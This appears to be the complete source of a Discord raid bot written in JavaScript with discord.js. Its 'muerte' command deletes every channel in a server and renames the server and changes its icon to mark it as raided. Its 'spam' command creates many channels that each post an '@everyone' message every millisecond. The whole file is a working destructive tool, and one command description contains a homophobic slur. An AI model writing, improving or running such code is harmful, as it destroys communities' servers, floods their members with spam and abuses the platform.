const { Client, GatewayIntentBits, REST, Routes, Guild, ChannelFlags, messageLink, TextChannel, ChannelType } = require('discord.js');
const {token, clientID} = require('./config.json')
const client = new Client({ intents: [GatewayIntentBits.Guilds] });
const commands = [
    {
      name: 'muerte',
      description: 'Usalo y averigualo, maricon',
      options:[
        {
          name: "nuevonombre",
          description: "Nombre del servidor",
          type: 3,
          required: false,
        },
        {
          name: "fotosv",
          description: "Foto del servidor",
          type: 11,
          required: false,
        }
      ]
    },
    {
      name: 'spam',
      description: 'es un mojarron jaja',
      options:[
        {
          name: "cantidadcanales",
          description:"Cantidad de canales",
          type: 4,
          required: true,
        },
        {
          name: "nombrecanal",
          description:"Nombre del canal",
          type: 3,
          required: true,
        },
        {
          name: "mensaje",
          description:"mensaje a ser spameado",
          type: 3,
          required: true,
        }
      ]
      
    },
  ];
  
  const rest = new REST({ version: '10' }).setToken(token);
  
  (async () => {
    try {
      await rest.put(Routes.applicationCommands(clientID), { body: commands });
    } catch (error) {
      console.error(error);
    }
  })();
client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
  client.user.setActivity("Rasurarme la cabeza", { type: "PLAYING"})
  client.on("ready", () => {
    client.user.setStatus("online");
});
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  if (interaction.commandName === 'muerte') {
    let nombreSv = interaction.options.getString('nuevonombre')
    let fotoSv = interaction.options.getAttachment('fotosv')
    console.log("Borrando canales")
    interaction.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
   if(nombreSv === null){
    interaction.guild.setName("Raideados por una pelona")
   } else {
    interaction.guild.setName(nombreSv)    
   }
    if(fotoSv === null){
      interaction.guild.setIcon("https://cdn.discordapp.com/attachments/881641283922329651/1023327999250145301/Screenshot_2022-09-24-14-57-32-514_com.discord.jpg")
    } else{
      interaction.guild.setIcon(fotoSv.proxyURL)
    }
  }
});

client.on('interactionCreate', async interaction => {
  if(!interaction.isChatInputCommand()) return;
  
  if(interaction.commandName === 'spam'){
    let cantidadMensajes = interaction.options.getInteger('cantidadcanales');
    let nombreCanal = interaction.options.getString('nombrecanal')
    let mensajez = interaction.options.getString('mensaje')
    console.log("Creando canales")
   for(let i = 0; i <= cantidadMensajes; i++){
    interaction.guild.channels.create({
      name: nombreCanal,
       type: ChannelType.TextChannel}).then((ch) =>{
        setInterval(() => {
          ch.send("@everyone " + mensajez);
        },1);
       })
   }
   interaction.reply("Creando...")   
   
  }
});

client.login(token);